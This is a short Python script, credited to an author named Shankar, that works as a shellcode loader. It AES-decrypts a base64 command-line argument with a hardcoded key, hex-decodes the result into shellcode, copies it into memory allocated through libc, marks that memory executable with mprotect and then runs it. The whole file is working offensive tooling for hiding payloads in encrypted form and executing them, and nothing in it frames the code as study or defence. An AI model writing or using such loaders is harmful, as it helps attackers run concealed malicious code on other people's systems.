#!/usr/bin/python
# Shellcode call python Credits - http://hacktracking.blogspot.in/2015/05/execute-shellcode-in-python.html
# Author :  Shankar
# Python Decrypt AES 128
#

from Crypto.Cipher import AES
from ctypes import *
import sys
import base64

def decryptor(basetoshell):
 seperation ='{'
 decode = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(seperation)
 cipher = AES.new('1111222233334444')
 decoded = decode (cipher, basetoshell)

#Call decoded shellcode

 libc = CDLL('libc.so.6')
 shellc = decoded.replace('\\x','').decode('hex')
 print (shellc)
 sc = c_char_p(shellc)
 size = len(shellc)
 addr = c_void_p(libc.valloc(size))
 memmove(addr, sc, size)
 libc.mprotect(addr, size, 0x7)
 run = cast(addr, CFUNCTYPE(c_void_p))

 run()
 sys.exit(0)

inpcode = sys.argv[1]
decryptor (inpcode)
